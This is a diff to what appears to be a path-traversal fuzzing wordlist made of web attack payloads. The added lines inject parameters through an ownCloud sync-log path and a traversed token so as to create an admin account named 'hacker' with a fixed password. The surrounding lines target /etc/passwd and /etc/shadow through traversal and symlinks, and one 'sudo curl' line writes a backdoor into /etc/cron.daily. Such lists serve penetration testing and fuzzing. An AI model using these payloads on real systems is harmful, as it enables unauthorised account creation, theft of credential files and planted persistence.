@@ -31,6 +31,7 @@ $ ln -s ../../../../../etc/passwd sympasswd
 ../gems/rack
 ../out_pwn/evil.proto
 ../test.csv
+.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
 ///etc/hosts
 ///etc/passwd
 /etc/hosts
@@ -43,6 +44,7 @@ $ ln -s ../../../../../etc/passwd sympasswd
 <@base64_2>{"account_id":"../../redirect?url=https://target.com/#","hash":0}<@/base64_2>
 <@base64_2>{"account_id":"../../redirect?url=https://target.com/search?q=REST+API#","hash":0}<@/base64_2>
 <@base64_2>{"account_id":"../../redirect?url=https://target.com/uploads/BountyPay.apk#","hash":0}<@/base64_2>
+?token=../../../../../../../ocs/v1.php/cloud/users
 Content-Disposition: form-data; name="file"; filename="/../../../../../.html"
 GET /help/%5c../%5c../%5c../Gemfile
 GET /help/../../../Gemfile
@@ -131,7 +133,9 @@ https://██████████/████/login/downloadForm?filename=
 irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
 live_reload ${attacker_server}/..\\..\\traversal_poc.dll
 ln -s /etc/shadow test_shadow
+nc://open/admin@pentest.cloud.wtf/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users
 options.pidfile = "/etc/passwd"   # Replace this with a critical or sensitive file
+path=/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log
 redirect_uri=https%3A%2F%2Ftarget.com%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
 sftp://host/~a../other/file
 sudo curl                                   -o "../../etc/cron.daily/zzz-backdoor"
